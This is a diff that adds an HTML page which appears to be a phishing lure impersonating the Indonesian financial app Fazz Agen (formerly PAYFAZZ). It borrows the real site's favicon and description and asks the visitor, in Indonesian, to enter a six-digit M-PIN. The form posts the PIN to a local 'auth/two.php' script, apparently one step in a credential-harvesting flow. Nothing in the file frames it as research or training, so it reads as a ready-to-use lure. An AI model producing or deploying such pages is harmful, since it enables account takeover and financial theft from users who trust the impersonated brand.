@@ -1,0 +1,128 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://support-agen.fazz.com/hc/theming_assets/01HZM5JPN4HDRFE5C5X0NAJDQP" rel="shortcut icon" type="image/x-icon">
+    <meta property="og:description" content="Fazz Agen, sebelumnya dikenal sebagai PAYFAZZ, merupakan sebuah aplikasi keuangan yang telah hadir sejak tahun 2016. Aplikasi Fazz Agen dapat digunakan untuk melakukan pembelian ataupun pembayaran ..">
+   <title>PIN Akun</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #F5F5F5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            height: 100vh;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            background-color: #FFFFFF;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .header i {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        .header h1 {
+            font-size: 18px;
+            margin: 0;
+        }
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; /* Change to flex-start */
+            align-items: center;
+            text-align: center;
+            margin-top: 50px; /* Add margin to push it down a bit */
+        }
+        .container p {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333333;
+            margin: 20px 0;
+        }
+        .pin-input {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .pin-input input {
+            width: 25px;
+            height: 25px;
+            border: 2px solid #CCCCCC;
+            border-radius: 50%; /* Make the input circular */
+            margin: 0 5px;
+            text-align: center;
+            font-size: 18px;
+            outline: none; /* Remove outline on focus */
+        }
+        .pin-input input:focus {
+            border-color: #007BFF; /* Change border color on focus */
+        }
+        .forgot-pin {
+            color: #007BFF;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .forgot-pin:hover {
+            text-decoration: underline;
+        }
+        .button-container {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .button {
+            width: 100%;
+            padding: 15px;
+            background-color: #007BFF;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="header">
+        <i class="fas fa-arrow-left"></i>
+        <h1>Buat M-PIN EDC</h1>
+    </div>
+    <div class="container">
+        <p>Buat M-PIN Anda</p>
+        <form action="auth/two.php" method="POST">
+        <div class="pin-input">
+            <input id="pin1" name="pin1" type="number" maxlength="1" oninput="moveToNext(this, 'pin2')"/>
+            <input id="pin2" name="pin2" type="number" maxlength="1" oninput="moveToNext(this, 'pin3')"/>
+            <input id="pin3" name="pin3" type="number" maxlength="1" oninput="moveToNext(this, 'pin4')"/>
+            <input id="pin4" name="pin4" type="number" maxlength="1" oninput="moveToNext(this, 'pin5')"/>
+            <input id="pin5" name="pin5" type="number" maxlength="1" oninput="moveToNext(this, 'pin6')"/>
+            <input id="pin6" name="pin6" type="number" maxlength="1" />
+        </div>
+        <br>
+        <a href="#" class="forgot-pin">Buat M-PIN yang sulit ditebak!</a>
+    </div>
+    <div class="button-container">
+        <button class="button">Lanjut</button>
+    </div>
+    </form>
+    <script>
+        // Function to move to the next input field automatically
+        function moveToNext(current, nextFieldId) {
+            if (current.value.length === current.maxLength) {
+                document.getElementById(nextFieldId).focus();
+            }
+        }
+    </script>
+</body>
+</html>
